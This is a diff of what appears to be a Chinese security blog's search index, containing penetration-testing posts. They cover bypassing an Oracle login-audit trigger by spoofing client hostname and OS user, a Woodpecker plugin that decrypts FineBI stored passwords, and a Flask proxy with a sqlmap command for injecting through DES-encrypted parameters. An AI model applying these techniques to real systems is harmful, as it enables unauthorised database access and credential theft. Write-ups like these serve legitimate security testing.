-<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>根据报错内容<code>触发器SYS.LOGON_AUDIT_TRIGGER</code>执行出错，查询对应<span class="exturl" data-url="aHR0cHM6Ly93d3cuZGJhLW9yYWNsZS5jb20vYXJ0X2J1aWxkZXJfc2VjX2F1ZGl0Lmh0bQ==">材料<i class="fa fa-external-link-alt"></i></span>可得知使用LOGON_AUDIT_TRIGGER是一个登录触发器（有登录行为及执行该触发器）。<img data-src="https://s2.loli.net/2023/04/06/iwZteM6EVOPSdNq.png"></p>
-<h1 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h1><p>根据现有情况猜测，数据库服务端对登录行为进行审计。判断并限制登录用户跟登录来源是否匹配，如果不匹配即不允许登录。通过修改驱动属性解决，将驱动属性中的machine设置为客户端主机名，osuser设置为客户端登录的用户。</p>
-<p><img data-src="https://s2.loli.net/2023/04/06/FaKYGsCrO2wk6Lq.png"></p>
-<p>成功连接</p>
-<p><img data-src="https://s2.loli.net/2023/04/06/pPO9T8Rng6UakzG.png"></p>
-]]></content>
-      <categories>
-        <category>安全</category>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>Oracle</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Webshell混淆-jsp类型</title>
     <url>/archives/a5dc99c.html</url>
     <content><![CDATA[<p>由于现在常见的shell（蚁剑、冰蝎、哥斯拉等），极其容易被一眼识破。因此，需要掌握一定的webshell混淆技巧用于对抗。</p>
@@ -691,6 +642,27 @@
       </categories>
       <tags>
         <tag>webshell</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Oracle-LOGON_AUDIT_TRIGGER限制</title>
+    <url>/archives/d36c1a86.html</url>
+    <content><![CDATA[<p>在某次红蓝演练中遇到Oracle用户、密码正确，但无法连接 提示没有权限。</p>
+<p><img data-src="https://s2.loli.net/2023/04/06/oMhbv9KRZicGs4N.png"></p>
+<span id="more"></span>
+
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>根据报错内容<code>触发器SYS.LOGON_AUDIT_TRIGGER</code>执行出错，查询对应<span class="exturl" data-url="aHR0cHM6Ly93d3cuZGJhLW9yYWNsZS5jb20vYXJ0X2J1aWxkZXJfc2VjX2F1ZGl0Lmh0bQ==">材料<i class="fa fa-external-link-alt"></i></span>可得知使用LOGON_AUDIT_TRIGGER是一个登录触发器（有登录行为及执行该触发器）。<img data-src="https://s2.loli.net/2023/04/06/iwZteM6EVOPSdNq.png"></p>
+<h1 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h1><p>根据现有情况猜测，数据库服务端对登录行为进行审计。判断并限制登录用户跟登录来源是否匹配，如果不匹配即不允许登录。通过修改驱动属性解决，将驱动属性中的machine设置为客户端主机名，osuser设置为客户端登录的用户。</p>
+<p><img data-src="https://s2.loli.net/2023/04/06/FaKYGsCrO2wk6Lq.png"></p>
+<p>成功连接</p>
+<p><img data-src="https://s2.loli.net/2023/04/06/pPO9T8Rng6UakzG.png"></p>
+]]></content>
+      <categories>
+        <category>安全</category>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>Oracle</tag>
       </tags>
   </entry>
   <entry>
@@ -764,6 +736,33 @@
       </categories>
       <tags>
         <tag>ssrf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>woodpecker插件编写</title>
+    <url>/archives/ec517011.html</url>
+    <content><![CDATA[<p>编写woodpecker帆软密码解密插件<br><img data-src="https://s2.loli.net/2023/07/27/Q2bSljkpq3OMdCV.jpg"></p>
+<span id="more"></span>
+
+<h1 id="编写"><a href="#编写" class="headerlink" title="编写"></a>编写</h1><p>目录结构</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">├── pom<span class="selector-class">.xml</span></span><br><span class="line">├── <span class="attribute">src</span></span><br><span class="line">│   ├── <span class="selector-tag">main</span></span><br><span class="line">│   │   ├── java</span><br><span class="line">│   │   │   └── me</span><br><span class="line">│   │   │       └── gv7</span><br><span class="line">│   │   │           └── woodpecker</span><br><span class="line">│   │   │               ├── helper</span><br><span class="line">│   │   │               │   ├── PasswdDecryptHelper<span class="selector-class">.java</span></span><br><span class="line">│   │   │               │   └── fineBIPasswordDcrypter<span class="selector-class">.java</span></span><br><span class="line">│   │   │               └── plugin</span><br><span class="line">│   │   │                   └──WoodpeckerPluginManager<span class="selector-class">.java</span></span><br><span class="line">│   │   └── test</span><br><span class="line">│   │       └── java</span><br><span class="line">│   └── test</span><br><span class="line">│       └── java</span><br><span class="line">│           └── fineBIDecrypterTest<span class="selector-class">.java</span></span><br><span class="line">└── target</span><br><span class="line">    ├── archive-tmp</span><br><span class="line">    ├── classes</span><br><span class="line">    │   └── me</span><br><span class="line">    │       └── gv7</span><br><span class="line">    │           └── woodpecker</span><br><span class="line">    │               ├── helper</span><br><span class="line">    │               │   ├── PasswdDecryptHelper<span class="selector-class">.class</span></span><br><span class="line">    │               │   └── fineBIPasswordDcrypter<span class="selector-class">.class</span></span><br><span class="line">    │               └── plugin</span><br><span class="line">    │                   └── WoodpeckerPluginManager<span class="selector-class">.class</span></span><br><span class="line">    ├── generated-sources</span><br><span class="line">    │   └── annotations</span><br><span class="line">    └── maven-status</span><br><span class="line">        └── maven-compiler-plugin</span><br><span class="line">            └── compile</span><br><span class="line">                └── default-compile</span><br><span class="line">                    ├── createdFiles<span class="selector-class">.lst</span></span><br><span class="line">                    └── inputFiles<span class="selector-class">.lst</span></span><br><span class="line"></span><br><span class="line"><span class="number">27</span> directories, <span class="number">10</span> files</span><br></pre></td></tr></table></figure>
+<p>WoodpeckerPluginManager.java</p>
+<figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> me.gv7.woodpecker.plugin;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> me.gv7.woodpecker.helper.fineBIPasswordDcrypter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WoodpeckerPluginManager</span> <span class="keyword"><span class="keyword">implements</span> <span class="type">IPluginManager</span></span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> void registerPluginManagerCallbacks(IPluginManagerCallbacks pluginManagerCallbacks) &#123;</span><br><span class="line">        fineBIPasswordDcrypter echoTextConverter = <span class="keyword">new</span> <span class="type">fineBIPasswordDcrypter</span>();</span><br><span class="line">        pluginManagerCallbacks.registerHelperPlugin(echoTextConverter);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>fineBIPasswordDcrypter.java</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> me.gv7.woodpecker.helper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> me.gv7.woodpecker.plugin.*;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">fineBIPasswordDcrypter</span> <span class="keyword">implements</span> <span class="title class_">IHelperPlugin</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> IHelperPluginCallbacks callbacks;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> IPluginHelper pluginHelper;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">fineBIPasswordDcrypter</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">HelperPluginMain</span><span class="params">(IHelperPluginCallbacks iHelperPluginCallbacks)</span> &#123;</span><br><span class="line">        callbacks = iHelperPluginCallbacks;</span><br><span class="line">        pluginHelper = callbacks.getPluginHelper();</span><br><span class="line">        callbacks.setHelperPluginName(<span class="string">&quot;FineBI password Decrypter&quot;</span>);</span><br><span class="line">        callbacks.setHelperPluginVersion(<span class="string">&quot;0.1.0&quot;</span>);</span><br><span class="line">        callbacks.setHelperPluginAutor(<span class="string">&quot;hywell&quot;</span>);</span><br><span class="line">        callbacks.setHelperPluginDescription(<span class="string">&quot;帆软BI密码解密&quot;</span>);</span><br><span class="line">        List&lt;IHelper&gt; helperList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        helperList.add(<span class="keyword">new</span> <span class="title class_">PasswdDecryptHelper</span>());</span><br><span class="line">        callbacks.registerHelper(helperList);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>PasswdDecryptHelper.java</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> me.gv7.woodpecker.helper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fr.properties.finedb.DBPropertyCipher;</span><br><span class="line"><span class="keyword">import</span> me.gv7.woodpecker.plugin.IHelper;</span><br><span class="line"><span class="keyword">import</span> me.gv7.woodpecker.plugin.IArg;</span><br><span class="line"><span class="keyword">import</span> me.gv7.woodpecker.plugin.IArgsUsageBinder;</span><br><span class="line"><span class="keyword">import</span> me.gv7.woodpecker.plugin.IResultOutput;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PasswdDecryptHelper</span> <span class="keyword">implements</span> <span class="title class_">IHelper</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">PasswdDecryptHelper</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getHelperTabCaption</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;FineBI password Decrypter&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> IArgsUsageBinder <span class="title function_">getHelperCutomArgs</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">IArgsUsageBinder</span> <span class="variable">argsUsageBinder</span> <span class="operator">=</span> fineBIPasswordDcrypter.pluginHelper.createArgsUsageBinder();</span><br><span class="line">        List&lt;IArg&gt; args = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="type">IArg</span> <span class="variable">argPassword</span> <span class="operator">=</span> fineBIPasswordDcrypter.pluginHelper.createArg();</span><br><span class="line">        argPassword.setName(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">        argPassword.setDefaultValue(<span class="string">&quot;NbqzauIuNWerl9wdI0o/k0bm0E+gY0eeTVTGnUFM4BlewX5/QHT/aZaVIRCLMTfNfuWVnePIo+C7&quot;</span> +</span><br><span class="line">                <span class="string">&quot;uPSLC7vfJORbYQf4dYG6DNHwgAFz0RVYPQX+BnWHvPofsvNmPaESpTE2o7cEUH711wihc0RAl/d9&quot;</span> +</span><br><span class="line">                <span class="string">&quot;0qUDfyNT/VecC3R2aj1hWwh/tmoXqm8qJd0FVrfy4rPK8gLEOt9pxY0iDSK9Wmlk6B8WEGl7DV9H&quot;</span> +</span><br><span class="line">                <span class="string">&quot;huMsgthuJnKZhVNajSW0FQjqBFq/TD3sKYhf8lFG1mBXPlqb/0wfQJI7KXzul7nykG0qJm/JR8B3&quot;</span> +</span><br><span class="line">                <span class="string">&quot;eQKd7/Q5W2TjUULl7B3IWoU/NTsZq/pq9O93ZQ==&quot;</span>);</span><br><span class="line">        argPassword.setDescription(<span class="string">&quot;需要解密的 password,需单行全部确认&quot;</span>);</span><br><span class="line">        argPassword.setRequired(<span class="literal">true</span>);</span><br><span class="line">        args.add(argPassword);</span><br><span class="line">        argsUsageBinder.setArgsList(args);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> argsUsageBinder;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doHelp</span><span class="params">(Map&lt;String, Object&gt; customArgs, IResultOutput iResultOutput)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> (String) customArgs.get(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">        password = password.replace(<span class="string">&quot;\\r\\n&quot;</span>,<span class="string">&quot;\n&quot;</span>).replace(<span class="string">&quot;\\n&quot;</span>,<span class="string">&quot;\n&quot;</span>).replace(<span class="string">&quot;\\=&quot;</span>,<span class="string">&quot;=&quot;</span>).replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">plainText</span> <span class="operator">=</span> DBPropertyCipher.getInstance().decode(password);</span><br><span class="line">            iResultOutput.successPrintln(<span class="string">&quot;Decrypt result:&quot;</span>);</span><br><span class="line">            iResultOutput.rawPrintln(<span class="string">&quot;\n&quot;</span> + plainText + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">            iResultOutput.errorPrintln(fineBIPasswordDcrypter.pluginHelper.getThrowableInfo(var6));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>maven打包出现未把帆软依赖打入jar中，使用maven-assembly-plugin解决</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-assembly-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">descriptorRefs</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">descriptorRef</span>&gt;</span>jar-with-dependencies<span class="tag">&lt;/<span class="name">descriptorRef</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">descriptorRefs</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后使用<code>mvn compile assembly:single</code>编译即可</p>
+]]></content>
+      <categories>
+        <category>安全</category>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>woodpecker</tag>
       </tags>
   </entry>
   <entry>
@@ -953,6 +952,49 @@
       </tags>
   </entry>
   <entry>
+    <title>渗透测试-响应加密SQL注入</title>
+    <url>/archives/8592a171.html</url>
+    <content><![CDATA[<p>在渗透的时候，发现有一处注入点请求参数进行了des加密，并且响应包也通过des进行了加密。想使用sqlmap进行注入，发现sqlmap不支持响应包处理操作（tamper只适用于请求包处理）。通过flask进行处理，最终使用sqlmap成功注入。</p>
+<p><img data-src="https://i.loli.net/2019/07/11/5d26a759ad31f57825.png" alt="sqlmap-result.png"></p>
+<span id="more"></span>
+
+<h1 id="寻找注入点"><a href="#寻找注入点" class="headerlink" title="寻找注入点"></a>寻找注入点</h1><p>发现一处页面名称为doQuery，猜测是用来执行查询功能。POST请求包：其参数名为reqParam，其值为des加密字段（url编码）。</p>
+<p><img data-src="https://i.loli.net/2019/07/11/5d2693a89620e87249.png" alt="request.png"></p>
+<p>经过验证确实为des加密，如何寻找key、iv在此就不赘述了，可以去<a href="/archives/5f6b1580.html" title="渗透测试-加密SQL注入">渗透测试-加密SQL注入</a>了解。</p>
+<p><img data-src="https://i.loli.net/2019/07/11/5d2696e5a958769670.png" alt="des-req.png"></p>
+<p>查看对应的响应包，发现整个响应包内容都被加密了</p>
+<p><img data-src="https://i.loli.net/2019/07/11/5d26a8e9661dd40130.png" alt="des-resp.png"></p>
+<p>使用对应的key能将响应包内容解密出来。</p>
+<p><img data-src="https://i.loli.net/2019/07/11/5d26975c2661630066.png" alt="des-resp.png"></p>
+<h2 id="SQLMap"><a href="#SQLMap" class="headerlink" title="SQLMap"></a>SQLMap</h2><h2 id="问题归纳"><a href="#问题归纳" class="headerlink" title="问题归纳"></a>问题归纳</h2><p>本以为SQLMap会自带功能对响应包进行解密，毕竟SQLMap支持自定义脚本（tamper）对请求包进行处理。根据sqlmap官方github仓库的<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NxbG1hcHByb2plY3Qvc3FsbWFwL2lzc3Vlcy8yMzA5">issues<i class="fa fa-external-link-alt"></i></span>，得知SQLMap不支持对响应内容进行编码处理。现在的问题点在于如何对response进行处理，认真想了想sqlmap支持proxy进行代理，那么可以通过代理将请求转发过来，由代理服务器对请求、响应进行处理。</p>
+<h2 id="flask代理"><a href="#flask代理" class="headerlink" title="flask代理"></a>flask代理</h2><p>需要实现几个关键点：</p>
+<ul>
+<li>对请求参数reqParam的值进行des加密，假定该值为encrypt_str</li>
+<li>对encrypt_str进行url编码处理，假定该值为post_data</li>
+<li>对响应包进行解密</li>
+</ul>
+<p>这里就直接贴代码给大家参考参考。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pyDes</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, Response</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote, quote</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy</span>():</span><br><span class="line">    secret_key = <span class="string">b&quot;****&quot;</span></span><br><span class="line">    k = pyDes.des(secret_key, pyDes.ECB, pad=<span class="literal">None</span>, padmode=pyDes.PAD_PKCS5)</span><br><span class="line">    encrypt_test_str = unquote(request.get_data().decode())[<span class="number">9</span>:]</span><br><span class="line">    encrypt_str = k.encrypt(encrypt_test_str)</span><br><span class="line">    post_data = <span class="string">b&#x27;reqParam=&#x27;</span> + quote(base64.b64encode(encrypt_str)).encode()</span><br><span class="line">    app.logger.info(<span class="string">&quot;Encrypt data:%s&quot;</span>, post_data)</span><br><span class="line">    resp = requests.request(</span><br><span class="line">        method=request.method,</span><br><span class="line">        url=request.url,</span><br><span class="line">        headers=&#123;key: value <span class="keyword">for</span> (key, value) <span class="keyword">in</span> request.headers <span class="keyword">if</span> key != <span class="string">&#x27;Host&#x27;</span>&#125;,</span><br><span class="line">        data=post_data,</span><br><span class="line">        cookies=request.cookies, allow_redirects=<span class="literal">False</span>, verify=<span class="literal">False</span>)</span><br><span class="line">    excluded_headers = [<span class="string">&#x27;content-encoding&#x27;</span>, <span class="string">&#x27;content-length&#x27;</span>, <span class="string">&#x27;transfer-encoding&#x27;</span>, <span class="string">&#x27;connection&#x27;</span>]</span><br><span class="line">    headers = [(name, value) <span class="keyword">for</span> (name, value) <span class="keyword">in</span> resp.raw.headers.items()</span><br><span class="line">               <span class="keyword">if</span> name.lower() <span class="keyword">not</span> <span class="keyword">in</span> excluded_headers]</span><br><span class="line">    response_data = base64.b64decode(resp.content)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;false&quot;</span> <span class="keyword">in</span> k.decrypt(response_data):</span><br><span class="line">        app.logger.error(<span class="string">&#x27;Response data:%s&#x27;</span>, k.decrypt(response_data))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        app.logger.info(<span class="string">&#x27;Response data:%s&#x27;</span>, k.decrypt(response_data))</span><br><span class="line">    response = Response(k.decrypt(response_data), resp.status_code, headers)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>将请求保存到sql.txt里，需要注意的是在sql.txt中reqParam参数需为解密之后字符串。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo python sqlmap.py -r sql.txt --proxy http://127.0.0.1:5000</span><br></pre></td></tr></table></figure>
+
+<h1 id="SQL注入问题解决"><a href="#SQL注入问题解决" class="headerlink" title="SQL注入问题解决"></a>SQL注入问题解决</h1><p>现在已经可以通过flask对请求、响应进行加密、解密等操作，但是查看sqlmap的返回结果，显示没有注入。Emmmm·····认真查看了json里面参数，发现有orderBy参数，直接使用*指定该参数，看看能不能有什么进展。</p>
+<p>这时候发现响应内容为：<code>&#123;&quot;errmsg&quot;:&quot;ORA-01785: ORDER BY item must be the number of a SELECT-list expression\\n&quot;,&quot;success&quot;:false&#125;&#39;</code>基本可以明确该点确实有问题，但是这次依旧跑不出来！</p>
+<p>认真查看发现爆出了原始语句，最后对注入点的语句进行“优化”，成功跑出来。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>​	1.有时候可以通过自己编写一些小工具辅助工作，例如本次使用flask结合sqlmap；</p>
+<p>​	2.在某些时候如果没有思路，对已有的信息再归纳归纳，或许有意想不到的收获，例如本次对注入点“优化”。</p>
+]]></content>
+      <categories>
+        <category>安全</category>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>SQLMAP</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>渗透笔记整理</title>
     <url>/archives/ff82748e.html</url>
     <content><![CDATA[<p>最近在整理印象笔记，其中有许许多多经验、研究和杂七杂八的想法，我会逐步上传到博客。<br><img data-src="https://i.loli.net/2018/02/10/5a7e9cdf1cedb.png" alt="印象笔记截图.PNG"></p>
@@ -1025,49 +1067,6 @@
       </tags>
   </entry>
   <entry>
-    <title>渗透测试-响应加密SQL注入</title>
-    <url>/archives/8592a171.html</url>
-    <content><![CDATA[<p>在渗透的时候，发现有一处注入点请求参数进行了des加密，并且响应包也通过des进行了加密。想使用sqlmap进行注入，发现sqlmap不支持响应包处理操作（tamper只适用于请求包处理）。通过flask进行处理，最终使用sqlmap成功注入。</p>
-<p><img data-src="https://i.loli.net/2019/07/11/5d26a759ad31f57825.png" alt="sqlmap-result.png"></p>
-<span id="more"></span>
-
-<h1 id="寻找注入点"><a href="#寻找注入点" class="headerlink" title="寻找注入点"></a>寻找注入点</h1><p>发现一处页面名称为doQuery，猜测是用来执行查询功能。POST请求包：其参数名为reqParam，其值为des加密字段（url编码）。</p>
-<p><img data-src="https://i.loli.net/2019/07/11/5d2693a89620e87249.png" alt="request.png"></p>
-<p>经过验证确实为des加密，如何寻找key、iv在此就不赘述了，可以去<a href="/archives/5f6b1580.html" title="渗透测试-加密SQL注入">渗透测试-加密SQL注入</a>了解。</p>
-<p><img data-src="https://i.loli.net/2019/07/11/5d2696e5a958769670.png" alt="des-req.png"></p>
-<p>查看对应的响应包，发现整个响应包内容都被加密了</p>
-<p><img data-src="https://i.loli.net/2019/07/11/5d26a8e9661dd40130.png" alt="des-resp.png"></p>
-<p>使用对应的key能将响应包内容解密出来。</p>
-<p><img data-src="https://i.loli.net/2019/07/11/5d26975c2661630066.png" alt="des-resp.png"></p>
-<h2 id="SQLMap"><a href="#SQLMap" class="headerlink" title="SQLMap"></a>SQLMap</h2><h2 id="问题归纳"><a href="#问题归纳" class="headerlink" title="问题归纳"></a>问题归纳</h2><p>本以为SQLMap会自带功能对响应包进行解密，毕竟SQLMap支持自定义脚本（tamper）对请求包进行处理。根据sqlmap官方github仓库的<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NxbG1hcHByb2plY3Qvc3FsbWFwL2lzc3Vlcy8yMzA5">issues<i class="fa fa-external-link-alt"></i></span>，得知SQLMap不支持对响应内容进行编码处理。现在的问题点在于如何对response进行处理，认真想了想sqlmap支持proxy进行代理，那么可以通过代理将请求转发过来，由代理服务器对请求、响应进行处理。</p>
-<h2 id="flask代理"><a href="#flask代理" class="headerlink" title="flask代理"></a>flask代理</h2><p>需要实现几个关键点：</p>
-<ul>
-<li>对请求参数reqParam的值进行des加密，假定该值为encrypt_str</li>
-<li>对encrypt_str进行url编码处理，假定该值为post_data</li>
-<li>对响应包进行解密</li>
-</ul>
-<p>这里就直接贴代码给大家参考参考。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pyDes</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, Response</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote, quote</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy</span>():</span><br><span class="line">    secret_key = <span class="string">b&quot;****&quot;</span></span><br><span class="line">    k = pyDes.des(secret_key, pyDes.ECB, pad=<span class="literal">None</span>, padmode=pyDes.PAD_PKCS5)</span><br><span class="line">    encrypt_test_str = unquote(request.get_data().decode())[<span class="number">9</span>:]</span><br><span class="line">    encrypt_str = k.encrypt(encrypt_test_str)</span><br><span class="line">    post_data = <span class="string">b&#x27;reqParam=&#x27;</span> + quote(base64.b64encode(encrypt_str)).encode()</span><br><span class="line">    app.logger.info(<span class="string">&quot;Encrypt data:%s&quot;</span>, post_data)</span><br><span class="line">    resp = requests.request(</span><br><span class="line">        method=request.method,</span><br><span class="line">        url=request.url,</span><br><span class="line">        headers=&#123;key: value <span class="keyword">for</span> (key, value) <span class="keyword">in</span> request.headers <span class="keyword">if</span> key != <span class="string">&#x27;Host&#x27;</span>&#125;,</span><br><span class="line">        data=post_data,</span><br><span class="line">        cookies=request.cookies, allow_redirects=<span class="literal">False</span>, verify=<span class="literal">False</span>)</span><br><span class="line">    excluded_headers = [<span class="string">&#x27;content-encoding&#x27;</span>, <span class="string">&#x27;content-length&#x27;</span>, <span class="string">&#x27;transfer-encoding&#x27;</span>, <span class="string">&#x27;connection&#x27;</span>]</span><br><span class="line">    headers = [(name, value) <span class="keyword">for</span> (name, value) <span class="keyword">in</span> resp.raw.headers.items()</span><br><span class="line">               <span class="keyword">if</span> name.lower() <span class="keyword">not</span> <span class="keyword">in</span> excluded_headers]</span><br><span class="line">    response_data = base64.b64decode(resp.content)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;false&quot;</span> <span class="keyword">in</span> k.decrypt(response_data):</span><br><span class="line">        app.logger.error(<span class="string">&#x27;Response data:%s&#x27;</span>, k.decrypt(response_data))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        app.logger.info(<span class="string">&#x27;Response data:%s&#x27;</span>, k.decrypt(response_data))</span><br><span class="line">    response = Response(k.decrypt(response_data), resp.status_code, headers)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>将请求保存到sql.txt里，需要注意的是在sql.txt中reqParam参数需为解密之后字符串。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo python sqlmap.py -r sql.txt --proxy http://127.0.0.1:5000</span><br></pre></td></tr></table></figure>
-
-<h1 id="SQL注入问题解决"><a href="#SQL注入问题解决" class="headerlink" title="SQL注入问题解决"></a>SQL注入问题解决</h1><p>现在已经可以通过flask对请求、响应进行加密、解密等操作，但是查看sqlmap的返回结果，显示没有注入。Emmmm·····认真查看了json里面参数，发现有orderBy参数，直接使用*指定该参数，看看能不能有什么进展。</p>
-<p>这时候发现响应内容为：<code>&#123;&quot;errmsg&quot;:&quot;ORA-01785: ORDER BY item must be the number of a SELECT-list expression\\n&quot;,&quot;success&quot;:false&#125;&#39;</code>基本可以明确该点确实有问题，但是这次依旧跑不出来！</p>
-<p>认真查看发现爆出了原始语句，最后对注入点的语句进行“优化”，成功跑出来。</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>​	1.有时候可以通过自己编写一些小工具辅助工作，例如本次使用flask结合sqlmap；</p>
